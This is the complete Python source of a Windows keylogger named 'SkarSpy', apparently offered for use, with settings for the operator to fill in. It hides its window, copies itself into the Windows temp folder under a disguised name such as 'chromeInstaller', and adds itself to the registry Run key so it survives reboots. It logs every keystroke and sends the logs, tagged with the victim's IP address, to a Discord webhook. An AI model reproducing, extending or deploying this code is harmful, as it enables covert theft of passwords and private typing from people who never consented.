import socket
import subprocess
import time
import os
import ctypes
import sys
from threading import Thread
import win32gui, win32con
import shutil
import random
import platform
import winreg as reg
from pynput.keyboard import Key, Listener
import discord
import requests
import json
from pynput.keyboard import Listener
import time
from colorama import Fore, Back, Style


############# ---------------------------------- Change Veriables Bellow ---------------------------------- #############

# Discord
webhook_url = 'YOUR_WEBHOOK_URL'

# Misc
file_path = r'C:\Windows\Temp\text.txt'

# Persistnace
makeHidden = True #RECOMENDED! 
install = True
install_folder = "C:\\Windows\\TEMP"  # change this to ur installation folder
install_name = "chromeInstaller" # make this a legit process name so the client wont be sus and wont del
Startup = True



#### ------------------------------------------------------------------------------------------------------------------------------------------------ ####
ip = socket.gethostbyname(socket.gethostname())

randomNum = random.random()

# Make hidden
if makeHidden == True:
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide , win32con.SW_HIDE)

# ----- Installtion to temp
if install:
    random_num = random.random()
    script_dir = os.path.dirname(os.path.abspath(__file__))
    script_name = os.path.basename(__file__)
    if script_dir != install_folder:
        new_script_name = f"{install_name}_{random_num}.py"
        new_script_path = os.path.join(install_folder, new_script_name)
        try:
            shutil.copy(__file__, new_script_path)
            print(f" [ @ ] Install To: {install_folder}")
            subprocess.Popen(f'start cmd /k python "{new_script_path}"', shell=True)
            sys.exit(0)
        except Exception as e:
            print(f" [ ! ] Failed to copy or run script: {e}")


# ----- Add to reg for persistance + startup
if Startup:
    try:
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        app_name = install_name  
        app_path = os.path.abspath(__file__)
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE) 
        reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
        reg.CloseKey(reg_key)
        print(f" [ * ] {app_name} has been added to startup.")
    except Exception as e:
        print(f" [ ! ] Failed to add to startup: {e}")


# ----- Send to webhook
def send_log_to_webhook_as_attachment(file_path):
    with open(file_path, 'rb') as file:
        message = f"**SkarSpy:** ```New key log from {ip} ``` "
        files = {'file': (file.name, file)}
        data = {
        "content": message
            }
        response = requests.post(webhook_url, data=data, files=files)

        if response.status_code == 204:
            print('send no errors lets gooooo!')
        else:
            print('shit did not work, prolly cus: ', response.content)

def on_key_press(key):
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            if hasattr(key, 'char'):
                file.write(key.char)
            elif key == Key.space:
                file.write(' ')
            elif key == Key.enter:
                file.write('\n')
            else:
                file.write(f' [{key}] ')

        if os.path.getsize(file_path) > 500:
            send_log_to_webhook_as_attachment(file_path)
            with open(file_path, 'w') as log_file:
                log_file.truncate(0)
    except Exception as e:
        print(f'Error: {str(e)}')

with Listener(on_press=on_key_press) as listener:
    listener.join()